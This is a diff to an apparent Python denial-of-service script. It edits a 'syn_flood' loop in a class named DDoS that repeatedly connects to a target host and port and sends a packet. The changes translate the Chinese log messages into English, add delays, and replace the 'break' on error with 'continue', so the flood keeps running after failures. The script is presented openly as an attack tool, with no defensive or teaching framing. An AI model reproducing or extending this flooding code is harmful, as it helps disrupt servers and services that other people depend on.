@@ -1,5 +1,6 @@
 import socket
 import threading
+import time
 import os
 ip=''
 port=80
@@ -31,16 +32,19 @@ class DDoS:
     
     def syn_flood(self):
         while True:
-            print("连接IP{0},端口{1}".format(self.host, self.port))
+            print("Connecting")
+            
             try:
                 self.client.connect((self.host, self.port))
                 self.client.send(self.pack)
+                print("Connect-IP:{0}\n Port:{1}".format(self.host, self.port))
+                time.sleep(0.2)
+                print("Successfully……")
             except Exception as error:
-                print("---------------------------------------------------------")
-                print("错误:\n" + str(error))
-                print("连接IP{0},端口{1}".format(self.host, self.port))
-                print("---------------------------------------------------------")
-                break
+                
+                print("Error:\n" + str(error))
+                time.sleep(0.2)
+                continue
 
 def input_settings():
     while True:
